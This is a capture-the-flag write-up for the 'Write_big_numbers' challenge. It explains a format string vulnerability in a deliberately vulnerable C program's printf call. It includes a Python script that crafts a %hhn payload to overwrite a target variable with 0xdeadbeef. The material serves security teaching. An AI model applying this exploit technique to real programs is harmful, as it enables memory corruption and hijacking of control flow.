# Challenge "Write_big_numbers" Writeup

- **Vulnerability**: Format String Vulnerability
  - _This type of vulnerability arises when user-supplied data is directly used as a format string in functions like `printf`, without appropriate validation. It can lead to arbitrary memory access or modification._
- **Where**: The vulnerability is located in the `vuln` function, particularly in the `printf(buffer)` call.
  - _In this instance, `buffer`, which is populated with user input, is unsafely used as a format string in `printf`, enabling the exploitation of the format string vulnerability._
- **Impact**: This vulnerability allows an attacker to write a specific value (`0xdeadbeef`) into the `target` variable.
  - _Through careful input crafting, an attacker can control the writing process to the `target` variable, demonstrating the capability to manipulate memory contents to meet specific conditions._
- **NOTE**: This challenge underscores the importance of proper input handling and showcases how format string vulnerabilities can be exploited to precisely modify memory contents, leading to unintended control flow changes or security compromises.

## Steps to Reproduce

1. **Compile the Vulnerable Program**: Use the provided C code and compile it with `gcc -m32 -Wall -Wextra -ggdb -no-pie`. This prepares the program with the format string vulnerability.
2. **Identify the Address of `target`**: Use debugging tools like GDB to determine the memory address of the `target` variable, which is `0x804c044`.
3. **Craft the Payload**: Develop a Python script to create a payload that utilizes the format string vulnerability. The payload should include the address of each byte of `target` and use format specifiers to write the bytes of `0xdeadbeef` into `target`.
   ```python
   import struct

   target_address = 0x804c044  # Address of 'target'
   bytes_to_write = [0xef, 0xbe, 0xad, 0xde]  # Bytes of 0xdeadbeef

   payload = "".join(struct.pack("<I", target_address + i) for i in range(4))
   printed_chars = 16  # Initial count from the addresses

   for i, byte_val in enumerate(bytes_to_write):
       padding = (byte_val - printed_chars) % 256
       if padding <= 0:
           padding += 256
       payload += "%{}c%{}$hhn".format(padding, 7 + i)
       printed_chars += padding

   print(payload)
    ```
4. **Execute the Vulnerable Program with the Payload**: Run the compiled program and input the generated payload. The program should overwrite the `target` variable with `0xdeadbeef`.

5. **Observe the Changed Program Behavior**: The program should recognize that the `target` variable has been modified to the specific value, displaying the success message and revealing the flag.
